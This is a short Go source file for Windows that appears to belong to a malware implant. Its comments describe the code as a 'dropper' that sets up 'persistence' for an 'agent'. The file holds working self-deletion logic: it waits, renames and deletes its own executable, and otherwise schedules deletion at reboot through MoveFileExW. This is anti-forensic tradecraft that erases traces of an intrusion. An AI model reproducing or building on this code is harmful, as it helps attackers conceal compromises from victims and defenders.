//go:build windows && !dll_sideload

package main

import (
	"os"
	"syscall"
	"time"
	"unsafe"
)

// scheduleDropperSelfDelete removes the original dropper binary after
// persistence has been set up and the agent runs from its persisted location.
// Strategy: rename (always works on Windows for running EXEs), then delete.
// If delete fails (file still locked), register for deletion on next reboot via
// MoveFileExW(MOVEFILE_DELAY_UNTIL_REBOOT).
func scheduleDropperSelfDelete() {
	selfPath, err := os.Executable()
	if err != nil {
		return
	}
	go func() {
		time.Sleep(3 * time.Second)
		tmpPath := selfPath + ".tmp"
		if os.Rename(selfPath, tmpPath) == nil {
			if os.Remove(tmpPath) == nil {
				return
			}
			rebootDelete(tmpPath)
			return
		}
		rebootDelete(selfPath)
	}()
}

func rebootDelete(path string) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	kernel32.NewProc("MoveFileExW").Call(
		uintptr(unsafe.Pointer(ptr)),
		0,
		0x4, // MOVEFILE_DELAY_UNTIL_REBOOT
	)
}
